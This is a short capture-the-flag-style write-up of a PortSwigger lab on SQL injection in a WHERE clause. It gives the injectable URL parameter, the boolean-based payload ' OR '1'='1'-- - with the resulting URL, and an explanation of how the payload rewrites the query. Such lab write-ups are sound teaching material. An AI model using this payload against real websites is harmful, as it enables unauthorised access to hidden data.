# 🛒 PortSwigger – SQL Injection in WHERE Clause

## 🧩 Challenge Information
- **Lab:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
- **Category:** Web Security  
- **Difficulty:** Easy  

---

## 📝 Description
The website filters products using the following SQL query:


SELECT * FROM products
WHERE category = 'Gifts' AND released = 1;


It only displays released products.  
Our goal is to retrieve **unreleased** items by bypassing the filter.

---

## 🛠️ Steps to Solve

### 1️⃣ Inspect the Category Parameter  
When selecting a category, the URL looks like:

/filter?category=Gifts


This value is likely inserted directly into the SQL query → potential injection point.

---

### 2️⃣ Inject a Payload  
Payload used:

' OR '1'='1'-- -


Final URL:

/filter?category=Gifts'+OR+'1'='1'-- -


---

### 3️⃣ Why This Works  
After injecting, the query becomes:


SELECT * FROM products
WHERE category = 'Gifts' OR '1'='1'-- ' AND released = 1;


Effects:
- `OR '1'='1'` evaluates **true**, bypassing the category filter  
- `-- -` comments out the `released = 1` condition  
- This exposes **all products**, including unreleased ones  

---

## 🎯 Takeaways
- Classic Boolean-based SQL Injection  
- `-- -` comments out remaining SQL  
- Very common in beginner-level web security labs  

